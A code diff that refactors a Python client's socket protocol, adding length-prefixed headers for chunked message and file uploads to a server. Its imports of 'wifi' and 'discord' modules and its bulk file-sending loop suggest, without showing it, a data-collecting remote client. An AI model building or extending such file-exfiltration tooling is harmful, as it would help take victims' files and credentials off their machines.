@@ -8,7 +8,7 @@ import uuid
 import psutil
 import sys
 import threading
-import base64
+import struct
 
 from modules import wifi
 from modules.discord import discord
@@ -78,37 +78,49 @@ class Client:
         for file in files:
             self.send_file(file)
 
+    def send(self, data: str, chunk_size: int = 1024) -> None:
+        """Send data in chunks to the server with a header."""
+        # Encode the data and append the delimiter
+        data_bytes = (data + "END_OF_MESSAGE").encode('utf-8')
+
+        # Prepare the header
+        message_type = b"JSON"  # 4 bytes
+        total_size = len(data_bytes)
+        header = struct.pack(">4sI", message_type, total_size)  # 4 bytes + 4 bytes
+
+        # Send the header first
+        self.client.sendall(header)
+
+        # Send the data in chunks
+        for i in range(0, total_size, chunk_size):
+            chunk = data_bytes[i:i + chunk_size]
+            self.client.sendall(chunk)
+
     def send_file(self, file_path: str) -> None:
+        """Send a file to the server with metadata."""
         print(f"Sending file '{file_path}' to server...")
 
-        # Notify server about the file
-        self.send(json.dumps(Message(type=MESSAGE_TYPE_PREFILE, json_data={
-            "file_name": file_path.split("\\")[-1],
-            "file_size": os.path.getsize(file_path),
-        }).to_dict()))
+        file_size = os.path.getsize(file_path)
+        file_name = os.path.basename(file_path)
 
-        response = json.loads(self.receive())
+        # Notify the server about the file metadata
+        metadata = json.dumps({
+            "type": MESSAGE_TYPE_PREFILE,
+            "file_name": file_name,
+            "file_size": file_size,
+        })
+        metadata_bytes = metadata.encode('utf-8')
+        header = struct.pack(">4sI", b"JSON", len(metadata_bytes))
+        self.client.sendall(header + metadata_bytes)
 
-        # Retrieve file ID from server response
-        id = response.get("data")
-        if not id:
-            print(f"Failed to receive file ID for '{file_path}'")
-            return
-
-        # Send file in chunks
+        # Send the file in chunks
         with open(file_path, "rb") as file:
-            while True:
-                chunk = file.read(1024)
-                if not chunk:
-                    break
-                self.client.sendall(chunk)
-            self.client.sendall(b'END_OF_FILE')
+            while chunk := file.read(1024):
+                header = struct.pack(">4sI", b"FILE", len(chunk))
+                self.client.sendall(header + chunk)
 
-    def send(self, data: str) -> None:
-        chunk_size = 1024
-        for i in range(0, len(data), chunk_size):
-            self.client.sendall(data[i:i+chunk_size].encode('utf-8'))
-        self.client.sendall(b'END_OF_MESSAGE')
+        print(f"File '{file_name}' sent successfully.")
+
 
     def receive(self) -> str:
         chunks = []
